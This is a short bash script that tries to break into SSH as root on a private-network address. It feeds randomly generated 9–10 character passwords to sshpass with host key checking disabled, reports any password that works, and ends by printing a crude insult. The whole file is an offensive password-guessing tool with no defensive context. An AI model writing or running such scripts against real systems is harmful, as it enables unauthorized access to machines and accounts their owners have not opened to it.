USER="root"
HOST="192.168.100.19"
MAX="10"

for ((len=9; len<=MAX; len++)); do
	for pass in $(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w $len | head -n 1000); do
	       echo "test: $pass";
		if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$USER@$HOST" exit 2>/dev/null; then
			echo "Pass: $pass"
			exit 0
		fi
	done
done

echo "pija puta"
